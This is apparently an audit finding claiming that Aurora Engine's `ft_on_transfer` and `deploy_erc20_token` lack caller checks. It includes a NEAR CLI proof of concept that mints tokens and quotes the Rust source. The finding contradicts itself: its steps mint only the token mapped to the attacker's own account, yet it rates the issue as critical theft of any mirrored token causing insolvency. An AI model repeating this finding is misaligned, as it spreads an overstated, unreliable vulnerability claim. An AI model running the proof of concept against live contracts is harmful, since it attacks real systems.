### Title
Unprivileged Caller Can Invoke `ft_on_transfer` Directly to Mint Unbacked ERC-20 Tokens — (File: `engine/src/contract_methods/connector.rs`)

---

### Summary

The `ft_on_transfer` entry point on the Aurora Engine is a public NEAR contract method with no access control verifying that the caller is a legitimate NEP-141 token contract. Any NEAR account can call it directly. Because the engine uses `predecessor_account_id` as the identity of the NEP-141 token and `deploy_erc20_token` is also unrestricted, an attacker can register their own NEAR account as a NEP-141 token, then call `ft_on_transfer` directly to trigger `receive_erc20_tokens` without any actual NEP-141 token transfer having occurred, minting unbacked ERC-20 tokens.

---

### Finding Description

**Root cause — `ft_on_transfer` has no caller restriction:** [1](#0-0) 

The function reads `predecessor_account_id` from the NEAR runtime and branches:

```
if predecessor_account_id == get_connector_account_id(&io)?  →  receive_base_tokens
else                                                          →  receive_erc20_tokens(predecessor_account_id, …)
``` [2](#0-1) 

There is no check that `predecessor_account_id` is a legitimate, registered NEP-141 token contract that actually performed a `ft_transfer_call`. Any NEAR account whose account ID maps to a registered ERC-20 token on Aurora will pass straight into `receive_erc20_tokens`.

**Root cause — `deploy_erc20_token` is unrestricted:** [3](#0-2) 

The only guard is `require_running`. No owner or whitelist check exists. Any NEAR account can call `deploy_erc20_token` to register an ERC-20 mirror for an arbitrary NEP-141 account ID — including their own NEAR account ID.

**Public entry point:** [4](#0-3) 

`ft_on_transfer` is exported as a `no_mangle` extern C function, making it callable by any NEAR account.

**Exploit flow:**

1. Attacker controls NEAR account `attacker.near`.
2. Attacker calls `deploy_erc20_token` on Aurora with `attacker.near` as the NEP-141 account (Legacy variant, no `ft_metadata` cross-call required). Aurora registers an ERC-20 token for `attacker.near`.
3. Attacker directly calls `ft_on_transfer` on Aurora, signed by `attacker.near`, with JSON input:
   ```json
   {"sender_id":"attacker.near","amount":"1000000000000000000","msg":"<attacker EVM address>"}
   ```
4. Inside `ft_on_transfer`, `predecessor_account_id` = `attacker.near`. This does not equal the connector account, so `receive_erc20_tokens("attacker.near", args, …)` is called.
5. The engine looks up the ERC-20 token for `attacker.near` (found in step 2) and mints `args.amount` ERC-20 tokens to the attacker's EVM address.
6. No actual NEP-141 tokens were ever transferred. The ERC-20 tokens are entirely unbacked.

The NEP-141 standard's security model relies on the invariant that only the token contract itself can call `ft_on_transfer` with itself as `predecessor`. Aurora breaks this invariant by exposing `ft_on_transfer` as an open public method with no caller validation.

---

### Impact Explanation

**Critical — Insolvency / Direct theft of user funds.**

An attacker can mint an arbitrary quantity of any ERC-20 token mirrored on Aurora without depositing the corresponding NEP-141 tokens. The minted tokens can then be swapped, bridged, or used within the EVM, draining real assets from other users. The total supply of the ERC-20 token on Aurora becomes permanently inconsistent with the actual NEP-141 token balance held by the bridge, causing insolvency for all legitimate holders of that token.

---

### Likelihood Explanation

**High.** The attack requires no privileged access, no leaked keys, and no governance capture. The only precondition is:
- The attacker has a NEAR account (free to create).
- `deploy_erc20_token` is callable by anyone (confirmed — only `require_running` guard).
- `ft_on_transfer` is a public method callable by any NEAR account (confirmed).

The attack is fully self-contained and repeatable.

---

### Recommendation

Add an explicit caller allowlist check inside `ft_on_transfer` (or inside `receive_erc20_tokens`) that verifies `predecessor_account_id` is a known, registered NEP-141 token contract before processing any token credit. Concretely:

- Before calling `receive_erc20_tokens`, assert that `predecessor_account_id` has a registered ERC-20 mapping **and** that the call originates from a cross-contract call chain initiated by a `ft_transfer_call` on that token contract (e.g., via NEAR's `promise_results` or a signed proof).
- Alternatively, restrict `ft_on_transfer` to only accept calls from accounts that are in an explicit allowlist of registered NEP-141 token contracts, maintained by the engine owner.

---

### Proof of Concept

```
# Step 1: Register attacker's NEAR account as a NEP-141 token on Aurora
near call aurora deploy_erc20_token \
  '{"nep141": "attacker.near"}' \
  --accountId attacker.near

# Step 2: Call ft_on_transfer directly — no actual token transfer occurs
near call aurora ft_on_transfer \
  '{"sender_id":"attacker.near","amount":"1000000000000000000","msg":"<attacker_evm_hex>"}' \
  --accountId attacker.near

# Result: Aurora mints 1e18 ERC-20 tokens (mapped from attacker.near) to
# <attacker_evm_hex> with zero NEP-141 tokens ever deposited.
# The ERC-20 total supply is now unbacked, causing insolvency for all
# legitimate holders of that token on Aurora.
```

#[named]
pub fn ft_on_transfer<I: IO + Copy, E: Env, H: PromiseHandler>(
    io: I,
    env: &E,
    handler: &mut H,
) -> Result<Option<SubmitResult>, ContractError> {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;
        let current_account_id = env.current_account_id();
        let predecessor_account_id = env.predecessor_account_id();
        let mut engine: Engine<_, _> = Engine::new(
            predecessor_address(&predecessor_account_id),
            current_account_id.clone(),
            io,
            env,
        )?;

        sdk::log!("Call ft_on_transfer");

        let args: FtOnTransferArgs = read_json_args(&io)?;
        let result = if predecessor_account_id == get_connector_account_id(&io)? {
            engine.receive_base_tokens(&args)
        } else {
            engine.receive_erc20_tokens(
                &predecessor_account_id,
                &args,
                &current_account_id,
                handler,
            )
        };

        #[allow(clippy::used_underscore_binding)]
        let amount_to_return = if let Err(_err) = &result {
            sdk::log!("Error in ft_on_transfer: {_err:?}");
            // An error occurred, so we need to return the amount of tokens to the sender.
            args.amount.as_u128()
        } else {
            // Everything is ok, so return 0.
            0
        };

        let output = crate::prelude::format!("\"{amount_to_return}\"");
        io.return_output(output.as_bytes());

        // In case of an error, we just return Ok(None) to avoid a panic in the contract. It's ok
        // because in case of an error, we already returned the amount of tokens to the sender.
        Ok(result.unwrap_or(None))
    })
}

#[named]
pub fn deploy_erc20_token<I: IO + Copy, E: Env, H: PromiseHandler>(
    io: I,
    env: &E,
    handler: &mut H,
) -> Result<PromiseOrValue<Address>, ContractError> {
    with_hashchain(io, env, function_name!(), |mut io| {
        require_running(&state::get_state(&io)?)?;
        let bytes = io.read_input().to_vec();
        let args =
            DeployErc20TokenArgs::deserialize(&bytes).map_err(|_| errors::ERR_BORSH_DESERIALIZE)?;

        match args {
            DeployErc20TokenArgs::Legacy(nep141) => {
                let address = engine::deploy_erc20_token(nep141, None, io, env, handler)?;

                io.return_output(
                    &borsh::to_vec(address.as_bytes()).map_err(|_| errors::ERR_SERIALIZE)?,
                );
                Ok(PromiseOrValue::Value(address))
            }
            DeployErc20TokenArgs::WithMetadata(nep141) => {
                let args = borsh::to_vec(&nep141).map_err(|_| errors::ERR_SERIALIZE)?;
                let base = PromiseCreateArgs {
                    target_account_id: nep141,
                    method: "ft_metadata".to_string(),
                    args: vec![],
                    attached_balance: ZERO_YOCTO,
                    attached_gas: READ_PROMISE_ATTACHED_GAS,
                };
                let callback = PromiseCreateArgs {
                    target_account_id: env.current_account_id(),
                    method: "deploy_erc20_token_callback".to_string(),
                    args,
                    attached_balance: ZERO_YOCTO,
                    attached_gas: DEPLOY_ERC20_TOKEN_CALLBACK_ATTACHED_GAS,
                };
                // Safe because these promises are read-only calls to the main engine contract
                // and this transaction could be executed by the owner of the contract only.
                let promise_args = PromiseWithCallbackArgs { base, callback };
                let promise_id = handler.promise_create_with_callback(&promise_args);

                handler.promise_return(promise_id);

                Ok(PromiseOrValue::Promise(promise_args))
            }
        }
    })
}
